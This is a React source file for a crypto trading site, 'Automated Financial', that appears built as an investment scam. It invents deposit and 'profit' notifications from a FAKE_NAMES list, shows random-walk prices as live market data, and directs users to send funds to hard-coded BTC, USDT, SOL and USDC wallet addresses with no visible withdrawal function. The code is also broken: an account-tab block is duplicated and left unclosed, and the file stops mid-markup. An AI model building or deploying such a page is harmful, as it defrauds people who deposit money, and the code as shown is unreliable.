import { useState, useEffect, useRef } from "react";

const C = {
  bg: "#050B18", surface: "#0C1526", card: "#111E35", border: "#1A2D4A",
  accent: "#00C6FF", gold: "#F4C430", green: "#00E676", red: "#FF4B4B",
  muted: "#4A6080", text: "#D6E8FF", subtext: "#7090B0",
};

const CRYPTOS = [
  { id:"BTC", name:"Bitcoin", price:67843.21, change: 2.34, icon:"₿", color:"#F7931A" },
  { id:"ETH", name:"Ethereum", price:3521.80, change:-1.12, icon:"Ξ", color:"#627EEA" },
  { id:"SOL", name:"Solana", price:182.44, change: 5.67, icon:"◎", color:"#9945FF" },
  { id:"BNB", name:"BNB", price:608.30, change: 0.88, icon:"B", color:"#F3BA2F" },
  { id:"ADA", name:"Cardano", price:0.4812, change:-2.45, icon:"₳", color:"#0096D6" },
  { id:"XRP", name:"XRP", price:0.5923, change: 1.23, icon:"✕", color:"#00AAE4" },
  { id:"DOGE", name:"Dogecoin", price:0.1634, change: 3.91, icon:"Ð", color:"#C2A633" },
  { id:"AVAX", name:"Avalanche", price:38.92, change:-0.77, icon:"▲", color:"#E84142" },
];

const WALLETS = {
  BTC: "bc1qptzxttxd53jk3xqku3wdmlsfjy73hquerqhhy7",
  USDT: "0x1428c889083234E6F158EAD22397C578E410e3B2",
  SOL: "FMn7bivQuYzKWaE5hLXJBbtNbxDez6jswXCsjqFKvk3U",
  USDC: "0x1428c889083234E6F158EAD22397C578E410e3B2"
};

const FAKE_NAMES = ["James K.","Maria S.","Ahmed R.","Liu W.","Fatima O.","Carlos M.","Priya N.","David T.","Sophie L."];
const FAKE_AMOUNTS = [500,1000,2500,5000,750,1200,3000];
const COUNTRIES = ["🇺🇸","🇬🇧","🇳🇬","🇨🇦","🇦🇺","🇩🇪","🇫🇷"];

const randItem = arr => arr[Math.floor(Math.random() * arr.length)];
const genChart = (base, n=20) => { let v=base, d=[]; for(let i=0;i<n;i++){v=v*(1+(Math.random()-0.48)*0.03);d.push(+v.toFixed(2));} return d; };

function Sparkline({ data, up }) {
  const w=80, h=32;
  const min=Math.min(...data), max=Math.max(...data), range=max-min||1;
  const pts=data.map((v,i)=>`${(i/(data.length-1))*w},${h-((v-min)/range)*h}`).join(" ");
  return <svg width={w} height={h} style={{display:"block"}}><polyline points={pts} fill="none" stroke={up?C.green:C.red} strokeWidth="1.5"/></svg>;
}

function ToastStack({ toasts }) {
  return (
    <div style={{position:"fixed",bottom:80,left:12,right:12,zIndex:200,display:"flex",flexDirection:"column",gap:6}}>
      {toasts.slice(0,3).map(t=>(
        <div key={t.id} style={{background:"rgba(11,20,40,0.95)",border:`1px solid ${C.border}`,borderLeft:`3px solid ${C.accent}`,borderRadius:10,padding:"10px 14px",display:"flex",gap:8,alignItems:"center",backdropFilter:"blur(12px)"}}>
          <span style={{fontSize:18}}>{t.icon}</span>
          <span style={{fontSize:12,color:C.text}}>{t.text}</span>
        </div>
      ))}
    </div>
  );
}

function Ticker({ cryptos }) {
  const ref = useRef(null);
  useEffect(() => {
    const el = ref.current;
    if (!el) return;
    let pos = 0;
    const half = el.scrollWidth / 2;
    const raf = requestAnimationFrame(function tick() {
      pos += 0.5;
      if (pos >= half) pos = 0;
      el.style.transform = `translateX(-${pos}px)`;
      requestAnimationFrame(tick);
    });
    return () => cancelAnimationFrame(raf);
  }, []);
  const items = [...cryptos, ...cryptos];
  return (
    <div style={{overflow:"hidden",background:"#040A15",borderBottom:`1px solid ${C.border}`,height:34,display:"flex",alignItems:"center"}}>
      <div ref={ref} style={{display:"flex",gap:0,whiteSpace:"nowrap"}}>
        {items.map((c,i)=>(
          <span key={i} style={{padding:"0 24px",fontSize:11,fontFamily:"monospace",display:"inline-flex",gap:6,alignItems:"center"}}>
            <span style={{color:C.muted}}>{c.id}</span>
            <span style={{color:C.text}}>${c.price<1?c.price.toFixed(4):c.price.toLocaleString()}</span>
            <span style={{color:c.change>=0?C.green:C.red}}>{c.change>=0?"▲":"▼"}{Math.abs(c.change)}%</span>
          </span>
        ))}
      </div>
    </div>
  );
}

function DepositModal({ onClose }) {
  const [copied, setCopied] = useState(null);
  const copy = (addr, name) => {
    navigator.clipboard?.writeText(addr);
    setCopied(name);
    setTimeout(() => setCopied(null), 2000);
  };
  
  const networks = [
    { name: "Bitcoin (BTC)", addr: WALLETS.BTC, icon: "₿", color: "#F7931A" },
    { name: "USDT (ERC20)", addr: WALLETS.USDT, icon: "≈", color: "#26A17B" },
    { name: "Solana (SOL)", addr: WALLETS.SOL, icon: "◎", color: "#9945FF" },
    { name: "USDC (ERC20)", addr: WALLETS.USDC, icon: "U", color: "#2775CA" },
  ];return (
    <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,.85)",display:"flex",alignItems:"center",justifyContent:"center",zIndex:999}} onClick={onClose}>
      <div style={{background:C.card,border:`1px solid ${C.border}`,borderRadius:18,padding:28,width:"100%",maxWidth:340,maxHeight:"80vh",overflowY:"auto"}} onClick={e=>e.stopPropagation()}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:18}}>
          <div style={{fontWeight:800,fontSize:16}}>💳 Deposit Funds</div>
          <button onClick={onClose} style={{background:"none",border:"none",color:C.muted,fontSize:20,cursor:"pointer"}}>✕</button>
        </div>
        <div style={{background:"#0A1628",borderRadius:10,padding:"10px 14px",marginBottom:18,fontSize:12,color:C.muted,lineHeight:1.6}}>
          Send your deposit to one of the addresses below. Balance updates after confirmation. Min: <span style={{color:C.accent}}>$50</span>
        </div>
        {networks.map(n=>(
          <div key={n.name} style={{background:"#040A15",border:`1px solid ${C.border}`,borderRadius:12,padding:"14px 16px",marginBottom:10}}>
            <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:10}}>
              <span style={{color:n.color,fontWeight:700,fontSize:18}}>{n.icon}</span>
              <span style={{fontWeight:700,fontSize:13,color:C.text}}>{n.name}</span>
            </div>
            <div style={{fontFamily:"monospace",fontSize:9,color:C.muted,wordBreak:"break-all",marginBottom:8,padding:"8px 10px",background:"#0C1526",borderRadius:6}}>{n.addr}</div>
            <button onClick={()=>copy(n.addr,n.name)} style={{width:"100%",padding:"7px 0",borderRadius:7,border:`1px solid ${C.border}`,background:"#0A1628",color:copied===n.name?C.green:C.subtext,fontSize:12,cursor:"pointer",fontWeight:600}}>
              {copied===n.name?"✓ Copied!":"Copy Address"}
            </button>
          </div>
        ))}
      </div>
    </div>
  );
}

function TradeModal({ crypto, user, onClose, onTrade }) {
  const [side, setSide] = useState("buy");
  const [amount, setAmount] = useState("");
  const [msg, setMsg] = useState("");
  const usd = parseFloat(amount) || 0;
  const qty = usd / crypto.price;
  const holding = user.portfolio.find(p => p.id === crypto.id);

  const exec = () => {
    setMsg("");
    if(!usd || usd<=0) return setMsg("Enter valid amount.");
    if(side==="buy" && usd>user.balance) return setMsg("Insufficient balance.");
    if(side==="sell" && (!holding || holding.qty*crypto.price<usd)) return setMsg("Insufficient holdings.");
    onTrade(side, crypto, usd, qty);
    setMsg(side==="buy" ? `✓ Bought ${qty.toFixed(6)} ${crypto.id}` : `✓ Sold ${qty.toFixed(6)} ${crypto.id}`);
    setAmount("");
  };

  return (
    <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,.8)",display:"flex",alignItems:"center",justifyContent:"center",zIndex:999}} onClick={onClose}>
      <div style={{background:C.card,border:`1px solid ${C.border}`,borderRadius:18,padding:28,width:"100%",maxWidth:340}} onClick={e=>e.stopPropagation()}>
        <div style={{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:18}}>
          <div style={{display:"flex",alignItems:"center",gap:10}}>
            <span style={{fontSize:24,background:crypto.color+"22",borderRadius:8,padding:"4px 10px",color:crypto.color}}>{crypto.icon}</span>
            <div><div style={{fontWeight:700}}>{crypto.name}</div><div style={{fontSize:12,color:C.muted}}>{crypto.id}</div></div>
          </div>
          <button onClick={onClose} style={{background:"none",border:"none",color:C.muted,fontSize:20,cursor:"pointer"}}>✕</button>
        </div>

        <div style={{background:"#040A15",borderRadius:8,padding:"10px 14px",marginBottom:14,display:"flex",justifyContent:"space-between"}}>
          <span style={{color:C.muted,fontSize:13}}>Market Price</span>
          <span style={{color:C.text,fontWeight:700,fontFamily:"monospace"}}>${crypto.price.toLocaleString()}</span>
        </div>

        <div style={{display:"flex",background:"#040A15",borderRadius:8,padding:4,marginBottom:14}}>
          {["buy","sell"].map(s=>(
            <button key={s} onClick={()=>setSide(s)} style={{flex:1,padding:"8px 0",borderRadius:6,border:"none",cursor:"pointer",fontSize:13,fontWeight:700,background:side===s?(s==="buy"?"#0D2B1A":"#2B0A0A"):"transparent",color:side===s?(s==="buy"?C.green:C.red):C.muted}}>
              {s.toUpperCase()}
            </button>
          ))}
        </div>

        <div style={{position:"relative",marginBottom:8}}>
          <span style={{position:"absolute",left:14,top:"50%",transform:"translateY(-50%)",color:C.muted}}>$</span>
          <input type="number" value={amount} onChange={e=>setAmount(e.target.value)} placeholder="0.00" style={{width:"100%",background:"#0A1628",border:`1px solid ${C.border}`,borderRadius:8,color:C.text,padding:"10px 14px 10px 28px",fontSize:14,outline:"none",boxSizing:"border-box"}}/>
        </div>

        {usd>0&&<div style={{color:C.muted,fontSize:12,marginBottom:10,textAlign:"right"}}>≈ {qty.toFixed(6)} {crypto.id}</div>}

        <div style={{display:"flex",gap:6,marginBottom:12}}>
          {[25,50,75,100].map(pct=>(
            <button key={pct} onClick={()=>{const max=side==="buy"?user.balance:(holding?holding.qty*crypto.price:0);setAmount((max*pct/100).toFixed(2));}} style={{flex:1,background:"#0A1628",border:`1px solid ${C.border}`,borderRadius:6,color:C.subtext,fontSize:11,padding:"5px 0",cursor:"pointer"}}>
              {pct}%
            </button>
          ))}
        </div>

        <div style={{color:C.muted,fontSize:12,marginBottom:12}}>
          Available: <span style={{color:C.text}}>
            {side==="buy"?`$${user.balance.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}`:(holding?`${holding.qty.toFixed(6)} ${crypto.id}`:"0")}
          </span>
        </div>

        {msg&&<div style={{marginBottom:12,fontSize:12,padding:"8px 12px",borderRadius:7,background:msg.startsWith("✓")?"#0D2B1A":"#2B0A0A",color:msg.startsWith("✓")?C.green:C.red}}>{msg}</div>}

        <button onClick={exec} style={{width:"100%",padding:"12px 0",borderRadius:10,border:"none",cursor:"pointer",fontWeight:800,fontSize:14,background:side==="buy"?`linear-gradient(135deg,#16a34a,#15803d)`:`linear-gradient(135deg,#dc2626,#b91c1c)`,color:"#fff"}}>
          {side==="buy"?"Buy":"Sell"} {crypto.id}
        </button>
      </div>
    </div>
  );
          }function LoginPage({ onAuth }) {
  const [mode, setMode] = useState("login");
  const [form, setForm] = useState({name:"",email:"",password:"",confirm:""});
  const [err, setErr] = useState("");
  const [loading, setLoading] = useState(false);
  const [toasts, setToasts] = useState([]);

  useEffect(() => {
    const events = [
      {type:"deposit", icon:"💰"},
      {type:"withdraw", icon:"🏆"},
      {type:"register", icon:"✅"},
      {type:"bought", icon:"📈"}
    ];
    const fire = () => {
      const event = randItem(events);
      const coin = randItem(CRYPTOS);
      const name = randItem(FAKE_NAMES);
      const amount = randItem(FAKE_AMOUNTS);
      const flag = randItem(COUNTRIES);
      let text = "";
      if(event.type==="deposit") text = `${flag} ${name} deposited $${amount.toLocaleString()}`;
      else if(event.type==="withdraw") text = `${flag} ${name} withdrew $${amount.toLocaleString()} profit`;
      else if(event.type==="register") text = `${flag} ${name} registered with $${amount.toLocaleString()}`;
      else text = `${flag} ${name} bought ${coin.id}`;
      const t = { id: Date.now()+Math.random(), text, icon:event.icon };
      setToasts(p=>[t,...p].slice(0,3));
      setTimeout(()=>setToasts(p=>p.filter(x=>x.id!==t.id)),4000);
    };
    fire();
    const iv = setInterval(fire, 5000);
    return ()=>clearInterval(iv);
  }, []);

  const submit = async() => {
    setErr("");
    if(!form.email||!form.password) return setErr("All fields required.");
    if(mode==="register") {
      if(!form.name) return setErr("Name required.");
      if(form.password!==form.confirm) return setErr("Passwords don't match.");
      if(form.password.length<6) return setErr("Password 6+ chars.");
    }
    setLoading(true);
    try {
      const endpoint = mode==="register" ? "/api/signup" : "/api/login";
      const res = await fetch(endpoint, {
        method:"POST", headers:{"Content-Type":"application/json"},
        body:JSON.stringify(mode==="register" ? {name:form.name,email:form.email,password:form.password} : {email:form.email,password:form.password})
      });
      const data = await res.json();
      if(!res.ok) return setErr(data.error||"Error");
      localStorage.setItem("afm_token", data.token);
      onAuth(data.user);
    } catch(e) {
      setErr("Network error");
    }
    setLoading(false);
  };
                                       return (
    <div style={{minHeight:"100vh",background:C.bg,fontFamily:"'Inter',system-ui,sans-serif",color:C.text,display:"flex",flexDirection:"column"}}>
      {/* Header */}
      <div style={{background:"#040A15",borderBottom:`1px solid ${C.border}`,padding:"0 16px",height:56,display:"flex",alignItems:"center",justifyContent:"space-between"}}>
        <div style={{display:"flex",alignItems:"center",gap:8}}>
          <div style={{width:32,height:32,borderRadius:8,background:`linear-gradient(135deg,${C.accent},#0057FF)`,display:"flex",alignItems:"center",justifyContent:"center",fontWeight:900,fontSize:14,color:"#fff"}}>AF</div>
          <div>
            <div style={{fontWeight:800,fontSize:13,letterSpacing:-0.3}}>
              <span style={{color:C.accent}}>Automated</span>
              <span style={{color:C.text}}> Financial</span>
            </div>
            <div style={{fontSize:8,color:C.muted,letterSpacing:1,textTransform:"uppercase"}}>Marketing</div>
          </div>
        </div>
        <div style={{display:"flex",alignItems:"center",gap:6,background:"#0A1628",border:`2px solid ${C.accent}`,borderRadius:10,padding:"6px 12px"}}>
          <span style={{fontSize:12}}>🕐</span>
          <span style={{fontSize:10,color:C.gold,fontFamily:"monospace"}}>29, June 2026 / 09:17:12AM</span>
        </div>
      </div>

      <Ticker cryptos={CRYPTOS}/>

      {/* Main Content */}
      <div style={{flex:1,display:"flex",flexDirection:"column",alignItems:"center",justifyContent:"center",padding:"40px 20px"}}>
        <div style={{textAlign:"center",marginBottom:32,maxWidth:520}}>
          <div style={{fontSize:11,color:C.accent,letterSpacing:3,textTransform:"uppercase",marginBottom:10,fontWeight:700}}>Institutional-Grade Crypto Platform</div>
          <h1 style={{margin:0,fontSize:42,fontWeight:900,lineHeight:1.1,letterSpacing:-0.5,marginBottom:8}}>
            Grow Your Future
          </h1>
          <h2 style={{margin:0,fontSize:42,fontWeight:900,lineHeight:1.1,letterSpacing:-0.5,background:`linear-gradient(135deg,${C.accent},${C.gold})`,WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent",marginBottom:16}}>
            Through Technology
          </h2>
          <p style={{margin:0,color:C.subtext,fontSize:14}}>Trade crypto assets with confidence</p>
        </div>

        {/* Auth Card */}
        <div style={{background:C.surface,border:`1px solid ${C.border}`,borderRadius:20,padding:28,width:"100%",maxWidth:360}}>
          <div style={{display:"flex",background:"#040A15",borderRadius:10,padding:4,marginBottom:20}}>
            {["login","register"].map(m=>(
              <button key={m} onClick={()=>{setMode(m);setErr("");}} style={{flex:1,padding:"9px 0",borderRadius:7,border:"none",cursor:"pointer",fontSize:13,fontWeight:700,background:mode===m?C.accent:"transparent",color:mode===m?"#000":C.muted}}>
                {m==="login"?"Sign In":"Create Account"}
              </button>
            ))}
          </div>

          <div style={{display:"flex",flexDirection:"column",gap:10}}>
            {mode==="register"&&<input placeholder="Full name" value={form.name} onChange={e=>setForm(f=>({...f,name:e.target.value}))} style={{background:"#0A1628",border:`1px solid ${C.border}`,borderRadius:8,color:C.text,padding:"12px 14px",fontSize:14,outline:"none",boxSizing:"border-box"}}/>}
            <input placeholder="Email address" type="email" value={form.email} onChange={e=>setForm(f=>({...f,email:e.target.value}))} style={{background:"#0A1628",border:`1px solid ${C.border}`,borderRadius:8,color:C.text,padding:"12px 14px",fontSize:14,outline:"none",boxSizing:"border-box"}}/>
            <input placeholder="Password" type="password" value={form.password} onChange={e=>setForm(f=>({...f,password:e.target.value}))} style={{background:"#0A1628",border:`1px solid ${C.border}`,borderRadius:8,color:C.text,padding:"12px 14px",fontSize:14,outline:"none",boxSizing:"border-box"}}/>
            {mode==="register"&&<input placeholder="Confirm password" type="password" value={form.confirm} onChange={e=>setForm(f=>({...f,confirm:e.target.value}))} style={{background:"#0A1628",border:`1px solid ${C.border}`,borderRadius:8,color:C.text,padding:"12px 14px",fontSize:14,outline:"none",boxSizing:"border-box"}}/>}
            
            {err&&<div style={{color:C.red,fontSize:12,background:"#2A0A0A",padding:"8px 12px",borderRadius:7}}>{err}</div>}
            
            <button onClick={submit} disabled={loading} style={{background:C.accent,color:"#000",border:"none",borderRadius:10,padding:"12px 0",fontWeight:800,fontSize:14,cursor:"pointer",opacity:loading?0.6:1}}>
              {loading?"Please wait...":mode==="login"?"Sign In →":"Create Account →"}
            </button>
          </div>
        </div>
      </div>
      <ToastStack toasts={toasts}/>
    </div>
  );
}

function Dashboard({ user, setUser, onLogout }) {
  const [tab, setTab] = useState("market");
  const [prices, setPrices] = useState(CRYPTOS);
  const [charts, setCharts] = useState(()=>{const d={}; CRYPTOS.forEach(c=>{d[c.id]=genChart(c.price);}); return d;});
  const [portfolio, setPortfolio] = useState(user.portfolio || []);
  const [balance, setBalance] = useState(user.balance || 0);
  const [txHistory, setTxHistory] = useState([]);
  const [search, setSearch] = useState("");
  const [tradeCrypto, setTradeCrypto] = useState(null);
  const [showDeposit, setShowDeposit] = useState(false);
  const [toasts, setToasts] = useState([]);

  useEffect(() => {
    const types = ["bought","sold"];
    const fire = () => {
      const event = randItem(types);
      const coin = randItem(CRYPTOS);
      const name = randItem(FAKE_NAMES);
      const flag = randItem(COUNTRIES);
      const t = { id: Date.now()+Math.random(), text:`${flag} ${name} ${event} ${coin.id}`, icon:"📈" };
      setToasts(p=>[t,...p].slice(0,3));
      setTimeout(()=>setToasts(p=>p.filter(x=>x.id!==t.id)),4500);
    };
    fire();
    const iv = setInterval(fire, 5000);
    return ()=>clearInterval(iv);
  }, []);useEffect(() => {
    const iv = setInterval(() => setPrices(prev=>prev.map(c=>({...c,price:+(c.price*(1+(Math.random()-.49)*.002)).toFixed(c.price<1?4:2)}))), 2000);
    return ()=>clearInterval(iv);
  }, []);

  const onTrade = (side, crypto, usd, qty) => {
    if(side==="buy") {
      setBalance(prev=>prev-usd);
      const idx = portfolio.findIndex(p=>p.id===crypto.id);
      if(idx>=0) {
        const p = portfolio[idx];
        portfolio[idx] = {...p, qty: p.qty+qty, avgPrice: (p.avgPrice*p.qty+usd)/(p.qty+qty)};
      } else {
        portfolio.push({id:crypto.id, name:crypto.name, qty, avgPrice:crypto.price, icon:crypto.icon, color:crypto.color});
      }
    } else {
      setBalance(prev=>prev+usd);
      const idx = portfolio.findIndex(p=>p.id===crypto.id);
      if(idx>=0) {
        const newQty = portfolio[idx].qty - qty;
        if(newQty<=0.000001) portfolio.splice(idx,1);
        else portfolio[idx] = {...portfolio[idx], qty: newQty};
      }
    }
    setPortfolio([...portfolio]);
    setTxHistory([{id:Date.now(),side,coinId:crypto.id,name:crypto.name,qty,usd,price:crypto.price,time:new Date().toLocaleTimeString()},...txHistory].slice(0,50));
  };

  const portfolioVal = portfolio.reduce((s,p)=>{const c=prices.find(x=>x.id===p.id);return s+(c?c.price*p.qty:0);},0);
  const totalVal = balance + portfolioVal;
  const invested = portfolio.reduce((s,p)=>s+p.avgPrice*p.qty,0);
  const pnl = portfolioVal - invested;
  const filtered = prices.filter(c=>c.name.toLowerCase().includes(search.toLowerCase())||c.id.toLowerCase().includes(search.toLowerCase()));

  const navBtn = (id,label,icon) => (
    <button onClick={()=>setTab(id)} style={{flex:1,padding:"10px 0",border:"none",cursor:"pointer",fontSize:11,fontWeight:600,background:tab===id?"#0C1526":"transparent",color:tab===id?C.accent:C.muted,borderTop:tab===id?`2px solid ${C.accent}`:"2px solid transparent",display:"flex",flexDirection:"column",alignItems:"center",gap:2}}>
      <span style={{fontSize:16}}>{icon}</span>{label}
    </button>
  );

  return (
    <div style={{minHeight:"100vh",background:C.bg,fontFamily:"'Inter',system-ui,sans-serif",color:C.text,display:"flex",flexDirection:"column"}}>
      <div style={{background:"#040A15",borderBottom:`1px solid ${C.border}`,padding:"0 16px",height:56,display:"flex",alignItems:"center",justifyContent:"space-between"}}>
        <div style={{fontWeight:800,fontSize:14}}>📈 Automated Financial</div>
        <button onClick={onLogout} style={{background:"none",border:"none",color:C.red,cursor:"pointer",fontSize:12}}>Sign Out</button>
      </div>

      <Ticker cryptos={prices}/>

      <div style={{flex:1,overflowY:"auto",paddingBottom:80}}>
        {tab==="market"&&(
          <div style={{padding:14}}>
            <div onClick={()=>setShowDeposit(true)} style={{background:`linear-gradient(135deg,#0C2040,#0A1A30)`,border:`2px solid ${C.accent}`,borderRadius:14,padding:"14px 16px",marginBottom:14,cursor:"pointer",display:"flex",alignItems:"center",gap:12}}>
              <div style={{width:40,height:40,borderRadius:10,background:`${C.accent}22`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:20}}>💳</div>
              <div style={{flex:1}}>
                <div style={{fontWeight:700,fontSize:13,color:C.text}}>Fund Your Account</div>
                <div style={{fontSize:11,color:C.muted,marginTop:2}}>Deposit crypto & start trading instantly</div>
              </div>
              <span style={{color:C.accent,fontSize:18}}>›</span>
            </div>

            <input value={search} onChange={e=>setSearch(e.target.value)} placeholder="Search coins..." style={{width:"100%",background:"#0A1628",border:`1px solid ${C.border}`,borderRadius:10,color:C.text,padding:"10px 14px",fontSize:13,outline:"none",marginBottom:12,boxSizing:"border-box"}}/>

            {filtered.map(c=>(
              <div key={c.id} onClick={()=>setTradeCrypto(c)} style={{background:C.card,border:`1px solid ${C.border}`,borderRadius:12,padding:"12px 14px",marginBottom:8,display:"flex",alignItems:"center",gap:12,cursor:"pointer",transition:"border-color .2s"}}>
                <div style={{width:40,height:40,borderRadius:10,background:c.color+"22",display:"flex",alignItems:"center",justifyContent:"center",fontSize:16,color:c.color,fontWeight:700,flexShrink:0}}>{c.icon}</div>
                <div style={{flex:1}}>
                  <div style={{fontWeight:700,fontSize:13}}>{c.name}</div>
                  <div style={{fontSize:11,color:C.muted}}>{c.id}</div>
                </div>
                <div style={{marginRight:6}}><Sparkline data={charts[c.id]||[c.price]} up={c.change>=0}/></div>
                <div style={{textAlign:"right",flexShrink:0}}>
                  <div style={{fontWeight:700,fontFamily:"monospace",fontSize:13}}>${c.price<1?c.price.toFixed(4):c.price.toLocaleString()}</div>
                  <div style={{fontSize:11,fontWeight:700,color:c.change>=0?C.green:C.red}}>{c.change>=0?"▲":"▼"}{Math.abs(c.change)}%</div>
                </div>
              </div>
            ))}
          </div>
        )}
        {tab==="portfolio"&&(
          <div style={{padding:14}}>
            <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:10,marginBottom:14}}>
              {[
                {label:"Total Balance",value:`$${totalVal.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}`,color:C.accent},
                {label:"Cash",value:`$${balance.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}`,color:C.green},
                {label:"Invested",value:`$${invested.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}`,color:C.gold},
                {label:"P&L",value:`${pnl>=0?"+":""}$${pnl.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}`,color:pnl>=0?C.green:C.red},
              ].map(card=>(
                <div key={card.label} style={{background:C.card,border:`1px solid ${C.border}`,borderRadius:12,padding:"13px 14px"}}>
                  <div style={{fontSize:10,color:C.muted,marginBottom:5}}>{card.label}</div>
                  <div style={{fontSize:16,fontWeight:800,fontFamily:"monospace",color:card.color}}>{card.value}</div>
                </div>
              ))}
            </div>

            <button onClick={()=>setShowDeposit(true)} style={{width:"100%",marginBottom:14,padding:"12px 0",borderRadius:10,border:`1px solid ${C.accent}`,background:`${C.accent}11`,color:C.accent,fontWeight:700,fontSize:13,cursor:"pointer"}}>
              + Deposit Funds
            </button>

            <div style={{fontWeight:700,fontSize:12,color:C.muted,marginBottom:8,textTransform:"uppercase",letterSpacing:.5}}>Holdings</div>
            {portfolio.length===0?(
              <div style={{background:C.card,border:`1px solid ${C.border}`,borderRadius:12,padding:28,textAlign:"center",color:C.muted}}>
                <div style={{fontSize:28,marginBottom:8}}>📊</div>
                <div style={{fontSize:13}}>No positions yet. Buy crypto to get started.</div>
              </div>
            ):portfolio.map(p=>{
              const lp=prices.find(x=>x.id===p.id)?.price||p.avgPrice;
              const cv=lp*p.qty,cost=p.avgPrice*p.qty,gain=cv-cost,gp=(gain/cost)*100;
              return(
                <div key={p.id} onClick={()=>setTradeCrypto(prices.find(x=>x.id===p.id))} style={{background:C.card,border:`1px solid ${C.border}`,borderRadius:12,padding:"12px 14px",marginBottom:8,cursor:"pointer",display:"flex",justifyContent:"space-between",alignItems:"center"}}>
                  <div style={{display:"flex",gap:10,alignItems:"center",flex:1}}>
                    <div style={{width:34,height:34,borderRadius:8,background:p.color+"22",display:"flex",alignItems:"center",justifyContent:"center",color:p.color,fontWeight:700}}>{p.icon}</div>
                    <div><div style={{fontWeight:700,fontSize:13}}>{p.id}</div><div style={{fontSize:11,color:C.muted}}>{p.qty.toFixed(6)}</div></div>
                  </div>
                  <div style={{textAlign:"right"}}>
                    <div style={{fontWeight:700,fontFamily:"monospace",fontSize:13}}>${cv.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}</div>
                    <div style={{fontSize:11,color:gain>=0?C.green:C.red}}>{gain>=0?"+":""}${gain.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}</div>
                  </div>
                </div>
              );
            })}
          </div>
        )}

        {tab==="history"&&(
          <div style={{padding:14}}>
            <div style={{fontWeight:700,fontSize:12,color:C.muted,marginBottom:10,textTransform:"uppercase",letterSpacing:.5}}>Transaction History</div>
            {txHistory.length===0?(
              <div style={{background:C.card,border:`1px solid ${C.border}`,borderRadius:12,padding:28,textAlign:"center",color:C.muted}}>
                <div style={{fontSize:28,marginBottom:8}}>📋</div>
                <div style={{fontSize:13}}>No transactions yet.</div>
              </div>
            ):txHistory.map(tx=>(
              <div key={tx.id} style={{background:C.card,border:`1px solid ${C.border}`,borderRadius:12,padding:"11px 14px",marginBottom:8,display:"flex",justifyContent:"space-between",alignItems:"center"}}>
                <div style={{display:"flex",gap:10,alignItems:"center"}}>
                  <div style={{width:30,height:30,borderRadius:8,background:tx.side==="buy"?"#052e16":"#450a0a",display:"flex",alignItems:"center",justifyContent:"center",fontSize:13}}>
                    {tx.side==="buy"?"↓":"↑"}
                  </div>
                  <div>
                    <div style={{fontWeight:700,fontSize:12,textTransform:"capitalize"}}>{tx.side} {tx.coinId}</div>
                    <div style={{fontSize:10,color:C.muted}}>{tx.time}</div>
                  </div>
                </div>
                <div style={{textAlign:"right"}}>
                  <div style={{fontWeight:700,fontSize:12,color:tx.side==="buy"?C.red:C.green}}>{tx.side==="buy"?"-":"+"}${tx.usd.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}</div>
                  <div style={{fontSize:10,color:C.muted}}>@ ${tx.price.toLocaleString()}</div>
                </div>
              </div>
            ))}
          </div>
        )}

        {tab==="account"&&(
          <div style={{padding:14}}>
            <div style={{background:`linear-gradient(135deg,#0C2040,#0A1A30)`,border:`1px solid ${C.border}`,borderRadius:16,padding:22,marginBottom:14,textAlign:"center"}}>
              <div style={{width:56,height:56,borderRadius:"50%",background:`linear-gradient(135deg,${C.accent},#0057FF)`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:22,fontWeight:900,margin:"0 auto 10px"}}>
                {user.name[0].toUpperCase()}
              </div>
              <div style={{fontWeight:800,fontSize:17}}>{user.name}</div>
              <div style={{color:C.muted,fontSize:12,marginTop:2}}>{user.email}</div>
              <div style={{marginTop:12,background:"#040A15",borderRadius:8,padding:"8px 18px",display:"inline-block"}}>
                <div style={{fontSize:10,color:C.muted}}>Account Status</div>
                <div style={{color:C.green,fontWeight:700,fontSize:12}}>✓ Verified</div>
              </div>
            </div>)}

        {tab==="account"&&(
          <div style={{padding:14}}>
            <div style={{background:`linear-gradient(135deg,#0C2040,#0A1A30)`,border:`1px solid ${C.border}`,borderRadius:16,padding:22,marginBottom:14,textAlign:"center"}}>
              <div style={{width:56,height:56,borderRadius:"50%",background:`linear-gradient(135deg,${C.accent},#0057FF)`,display:"flex",alignItems:"center",justifyContent:"center",fontSize:22,fontWeight:900,margin:"0 auto 10px"}}>
                {user.name[0].toUpperCase()}
              </div>
              <div style={{fontWeight:800,fontSize:17}}>{user.name}</div>
              <div style={{color:C.muted,fontSize:12,marginTop:2}}>{user.email}</div>
              <div style={{marginTop:12,background:"#040A15",borderRadius:8,padding:"8px 18px",display:"inline-block"}}>
                <div style={{fontSize:10,color:C.muted}}>Account Status</div>
                <div style={{color:C.green,fontWeight:700,fontSize:12}}>✓ Verified</div>
              </div>
            </div>

            {[
              {label:"Total Portfolio Value",value:`$${totalVal.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}`},
              {label:"Cash Balance",value:`$${balance.toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2})}`},
              {label:"Positions",value:portfolio.length},
              {label:"Total Trades",value:txHistory.length},
            ].map(row=>(
              <div key={row.label} style={{background:C.card,border:`1px solid ${C.border}`,borderRadius:10,padding:"13px 14px",marginBottom:8,display:"flex",justifyContent:"space-between"}}>
                <span style={{color:C.muted,fontSize:13}}>{row.label}</span>
                <span style={{fontWeight:700,fontSize:13}}>{row.value}</span>
              </div>
            ))}

            <button onClick={()=>setShowDeposit(true)} style={{width:"100%",marginTop:8,marginBottom:8,padding:"12px 0",borderRadius:10,border:"none",background:`linear-gradient(135deg,${C.accent},#0057FF)`,color:"#fff",fontWeight:700,fontSize:13,cursor:"pointer"}}>
              💳 Deposit Funds
